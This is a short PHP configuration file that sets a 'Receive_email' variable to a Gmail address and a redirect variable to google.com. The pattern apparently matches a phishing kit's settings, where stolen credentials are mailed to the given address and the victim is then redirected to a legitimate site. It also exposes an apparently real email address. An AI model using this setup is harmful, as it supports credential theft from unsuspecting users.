<?php 
$Receive_email="swiftceda15@gmail.com";
$redirect="https://www.google.com/";
?>